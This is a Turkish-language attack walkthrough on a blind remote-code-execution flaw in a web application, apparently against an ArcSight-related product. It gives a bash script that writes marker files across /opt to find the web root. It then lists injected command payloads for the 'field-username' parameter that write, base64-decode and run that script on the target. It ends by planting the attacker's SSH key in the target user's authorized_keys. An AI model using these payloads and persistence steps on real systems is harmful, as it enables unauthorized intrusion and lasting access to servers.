## BlackBox yöntemlerle, veb uygulamanın kök dizinini bulma

Kullandığım komutların çıktısını eğer veb uygulamanın kök dizinine yazarsam(kısa bir araştırmayla, konferansta konuşulan proqramda bunun /opt dizini altında olduğunu öğrenmek mümkün) ve daha sonra hedefe sadece bir HTTP GET sorgusu gönderirsem, yazdığım komutun çıktısını ala bilirim.
Mesela, "id > /opt/KÖK_DİZİN > output.txt" yazarsam ve `https://target/output.txt` diye bir HTTP sorgu gönderirsem, id komutumun çıktısını ala bilirim.
Ama soru şu, hedef veb uygulamanın kök dizinini, konferansta konuşulan blind RCE ile nasıl bula biliriz?

Bu task için bir bash skript yazdım, eğer bunu hedefe bir şekilde yükleyip çalıştırırsak o uygulamanın kök dizinini bulur ve o dizini woot.txt diye bir dosyaya yazar. Yani, bu skripti hedefe yükleyip çalıştırdıktan sonra, `https://target/woot.txt` diyerek kök dizini öğrene bilirim.
```bash
#!/bin/bash
# HackerConf 2021
find /opt -type d > /tmp/dirs
for i in $(cat /tmp/dirs)
do 
        echo wootwoot > $i/woot.txt
        a="$(curl 127.0.0.1/woot.txt)"
        if [[ $a == *"wootwoot"* ]]; then
                echo "ROOT directory of the WebApp has been found! -> $i" > $i/woot.txt
                break
        fi
		rm $i/woot.txt
done
```

## İzole sistemlerde dosya transferi

İkinci soru şu, hedefin outbound trafiki kapalıysa, bu skripti hedefe nasıl yüklerim ?
Benim bu tür durumlarda en çok kullandığım metod, base64 encode/decode yöntemidir.
Mesela, diyelim ki, yukarıdaki skriptin ismi woot.sh, bu dosyayı aşağıdaki adımları gerçekleştirerek hedefe yükleyebilirim.

- base64 -w0 woot.sh > encoded-woot (Bu saldırgan tarafta yapılır, -w0 seçeneği önemli, çıktıyı tek bir satırda verir ve dosya encode/decode olurken zarar görmez)
- Blind RCE olan field-username parametresine, `{*}echo\\x20-n\\x20encoded_woot_dosyasının_içeriği\\x20\>/tmp/woot-encoded] [exec fakeuser` yazıyoruz(URL encode ederek)
- Yukarıdeki sorgudan sonra artık hedefte, /tmp dizini altında skriptimizin encode olunmuş hali olacaktır
- Yine field-username parametresine, `{*}base64\\x20-d\\x20/tmp/woot-encoded\\x20\>/tmp/woot.sh [exec fakeuser` yazıyoruz(URL encode ederek)
- Yukarıdaki komutdan sonra artık woot.sh skripti hedefte /tmp dizinine yazılacaktır
- Geriya kalan bu skripti çalıştırmak, yine, field-username parametresine `{*}bash\\x20/tmp/woot.sh] [exec fakeuser` yazıyoruz(URL encode ederek)
- Daha sonra, `https://target/woot.txt` HTTP GET sorgusu yaparak kök dizini öğrenebiliriz. Diyelim ki, bu kök dizin /opt/test/test1/test2, bu durumda yazdığım tüm komutların çıktısını bu dizine yazar ve daha önce söylemiş olduğum HTTP GET sorgularıyla çıktıları okuya bilirim.
- En son, kendi ssh public key'mi hedef kullanıcın(arcsight) authorized_keys dosyasına yazarak sunucuya ssh üzerinden erişebilirim.
